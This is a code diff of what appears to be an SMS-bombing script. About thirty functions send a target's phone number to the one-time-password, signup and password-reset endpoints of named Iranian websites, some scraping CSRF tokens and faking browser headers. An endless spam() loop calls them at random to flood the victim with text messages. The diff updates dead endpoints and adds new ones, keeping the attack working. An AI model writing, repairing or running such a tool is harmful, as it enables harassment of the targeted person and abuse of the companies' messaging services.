@@ -62,9 +62,9 @@ def getnum():
 
 def ASM1(number):
 	number = '0' + number
-	djson = {'channel':'sms', 'recipient':number}
-	s = requests.post('https://chilivery.com/client-api/otp/request', json = djson).json()
-	if(s['status'] == True):
+	data = {'mobile':number}
+	s = requests.post('https://www.delino.com/user/register', data = data)
+	if(s.text == '{"password":false}' and s.status_code == 200):
 		return 1
 
 
@@ -137,11 +137,10 @@ def ASM9(number):
 
 
 def ASM10(number):
-	s = requests.get('https://www.digikala.com/users/login-register/').text
-	rc = (s.split('<input type="hidden" name="rc" value="'))[1].split('"/>')[0]
-	rd = (s.split('<input type="hidden" name="rd" value="'))[1].split('"/>')[0]
-	data = {'rc':rc, 'rd':rd, 'login[email_phone]':number}
-	r = requests.post('https://www.digikala.com/users/login-register/', data = data)
+	data = {'Number':number}
+	s = requests.post('https://fidilio.com/api/MemberUser/Mobile', data = data)
+	if('<h1>این شماره قبلا استفاده شده است لطفا از فراموشی رمز عبور استفاده کنید</h1>' not in s.text and s.status_code == 200):
+		return 1
 
 
 def ASM11(number):
@@ -154,14 +153,10 @@ def ASM11(number):
 
 def ASM12(number):
 	number = '0' + number
-	s = requests.get('https://idpay.ir/user/auth').text
-	cid = (s.split('<input type="hidden" name="captcha_sid" value="'))[1].split('" />')[0]
-	ctk = (s.split('<input type="hidden" name="captcha_token" value="'))[1].split('" />')[0]
-	fbi = (s.split('<input type="hidden" name="form_build_id" value="'))[1].split('" />')[0]
-	#grr = (s.split(''))[1].split('')[0]
-	data = {'phone':number, 'captcha_sid':cid, 'captcha_token':ctk, 'captcha_response':'Google+no+captcha', 'g-recaptcha-response':'', 'captcha_cacheable':'1', 'op':'بررسی+و+ادامه', 'form_build_id':fbi, 'form_id':'idpay_auth_form'}
-	r = requests.post('https://idpay.ir/user/auth', data = data).text
-	print(r)
+	djson = {'mobile':number}
+	s = requests.post('https://api.dunro.com/api/v1.4/appLinkSender', json = djson).text
+	if(s == '"done"'):
+		return 1
 
 
 def ASM13(number):
@@ -232,13 +227,9 @@ def ASM20(number):
 
 def ASM21(number):
 	number = '0' + number
-	s = requests.get('https://raygansms.com/SendTestResult.aspx').text
-	vstate = (s.split('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="'))[1].split('" />')[0]
-	vstateg = (s.split('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'))[1].split('" />')[0]
-	eventv = (s.split('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="'))[1].split('" />')[0]
-	data = {'__VIEWSTATE':vstate, '__VIEWSTATEGENERATOR':vstateg, '__EVENTVALIDATION':eventv, 'ctl00$ContentPlaceHolder1$TextBox1':number, 'ctl00$ContentPlaceHolder1$Button1':'ارسال+پیام', 'ctl00$TextBox1':'شماره+را+اینجا+وارد+کنید'}
-	r = requests.post('https://raygansms.com/SendTestResult.aspx', data = data)
-	if(r.status_code == 200):
+	data = {'mobile':number}
+	s = requests.post('https://www.delino.com/app/sms', data = data)
+	if(s.status_code == 200):
 		return 1
 
 
@@ -262,22 +253,22 @@ def ASM24(number):
 	number = '98' + number
 	djson = {'msisdn':number}
 	s = requests.post('https://app.lenz.ir:64014/api/v2/auth/forget/generate/otp', json = djson).json()
-	if(s['message'] == 'این شماره قبلا ثبت نام نکرده است'):
+	if('success' in s and s['success'] == True):
+		return 1
+	elif(s['message'] == 'این شماره قبلا ثبت نام نکرده است'):
 		r = requests.post('https://app.lenz.ir:64014/api/v2/auth/register/otp/generate', json = djson).json()
 		if(r['success'] == True):
 			return 1
-	elif('success' in s and s['success'] == True):
-		return 1
 	elif(s['message'] == 'تعداد دفعات ارسال رمز یکبار مصرف بیش از حد مجاز است'):
 		return None
 
 
 def ASM25(number):
 	number = '0' + number
-	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
-	data = {'content':'', 'mobile_no':number}
-	s = requests.post('https://auth-s.asanpardakht.net/auth/api/v1/authentication/signup/', verify = False, data = data)
-	print(s.text)
+	djson = {'mobile':number}
+	s = requests.post('https://api.dunro.com/api/v3/auth/smsauth/requestcode', json = djson).json()
+	if(s['meta']['code'] == 200):
+		return 1
 
 
 def ASM26(number):
@@ -291,27 +282,63 @@ def ASM26(number):
 
 def ASM27(number):
 	number = '98' + number
-	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
-	s = requests.get('https://shgetdcmess.iranlms.ir/', verify = False).json()
-	url = s['data']['API'][s['data']['default_api']]
-	headers = {'Accept':'application/json, text/plain, */*', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-GB,en;q=0.5', 'Connection':'keep-alive', 'Content-Length':'96', 'Content-Type':'text/plain', 'Host':url[8:], 'Origin':'https://shadweb.iranlms.ir', 'Referer':'https://shadweb.iranlms.ir/', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0'}
-	data = {'api_version':'3', 'method':'sendCode', 'data':{'phone_number':number, 'send_type':'SMS'}}
-	r = requests.post(url, verify = False, headers = headers, data = data).json()
-	print(r)
+	s = requests.get('https://shgetdcmess.iranlms.ir/').json()
+	url = 'https://shadmessenger' + s['data']['default_api'] + '.iranlms.ir/'
+	jdata = {'api_version': '3', 'data': {'phone_number': number, 'send_type': 'SMS'}, 'method': 'sendCode'}
+	r = requests.post(url, json = jdata).json()
+	if(r['status'] == 'OK'):
+		return 1
 
 
 def ASM28(number):
 	number = '0' + number
 	djson = {'phone':number}
-	s = requests.post('https://mobapi.banimode.com/api/bts/auth/request', json = djson).json()
+	s = requests.post('https://mobapi.banimode.com/api/v1/auth/request', json = djson).json()
 	if(s['status'] == 'success' and s['status_code'] == 200):
 		return 1
+
+
+def ASM29(number):
+	number = '0' + number
+	s = requests.get('https://app.100startups.ir/login/').text
+	csrf = (s.split('<input type="hidden" name="csrfmiddlewaretoken" value="'))[1].split('">')[0]
+	data = {'csrfmiddlewaretoken':csrf, 'mobile':number, 'submit_mobile':''}
+	headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.9', 'Cache-Control':'max-age=0', 'Connection': 'keep-alive', 'Content-Length': '118', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie':'csrftoken=' + csrf + ';', 'Host':'app.100startups.ir', 'Origin':'https://app.100startups.ir', 'Referer':'https://app.100startups.ir/login/', 'Sec-Fetch-Dest':'document', 'Sec-Fetch-Mode':'navigate', 'Sec-Fetch-Site':'same-origin', 'Sec-Fetch-User':'?1', 'Upgrade-Insecure-Requests':'1', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'}
+	r = requests.post('https://app.100startups.ir/login/', headers = headers, data = data)
+	r.encoding = r.apparent_encoding
+	if('</i>چنین حسابی وجود ندارد</h2>' not in r.text and '</i>پس از دو دقیقه دوباره تلاش کنید</h2>' not in r.text and 'کد ارسال شده' in r.text):
+		return 1
+	else:
+		l = requests.get('https://app.100startups.ir/verify/').text
+		csrf = (l.split('<input type="hidden" name="csrfmiddlewaretoken" value="'))[1].split('">')[0]
+		data = {'csrfmiddlewaretoken':csrf, 'phone':number}
+		headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Content-Length':'102','Content-Type':'application/x-www-form-urlencoded','Cookie':'csrftoken=' + csrf + ';','Host':'app.100startups.ir','Origin':'https://app.100startups.ir','Referer':'https://app.100startups.ir/register/','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'}
+		m = requests.post('https://app.100startups.ir/register/', headers = headers, data = data)
+		m.encoding = m.apparent_encoding
+		if('اعتبارسنجی' in m.text):
+			return 1
+
+
+def ASM30(number):
+	number = '0' + number
+	djson = {'cellphone':number}
+	s = requests.post('https://mamifood.org/Registration.aspx/IsUserAvailable', json = djson).json()
+	if(s['d'] == False):
+		djson = {'Phone':number}
+		r = requests.post('https://mamifood.org/Registration.aspx/SendValidationCode', json = djson).json()
+		if(r['d'] != ''):
+			return 1
+	else:
+		djson = {'phone':number}
+		l = requests.post('https://mamifood.org/Registration.aspx/Remember', json = djson).json()
+		if(l['d'] == True):
+			return 1
 
 
 def spam(phonenum):
 	done = 0
 	while(True):
-		k = eval('ASM' + str(random.randint(1, 28)) + '(phonenum)')
+		k = eval('ASM' + str(random.randint(1, 30)) + '(phonenum)')
 		if(k == 1):
 			done += 1
 			clean()
